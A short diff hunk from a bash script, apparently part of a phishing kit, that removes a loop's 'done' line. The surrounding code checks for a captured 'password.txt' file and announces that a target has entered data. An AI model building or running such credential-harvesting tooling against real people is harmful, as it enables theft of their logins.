@@ -32,8 +32,6 @@ hedygans
 rm -rf ip.txt
 fi
 sleep 0.05
-done
-
 if [[ -e "site/$server/password.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Target menulis!\n"
 password
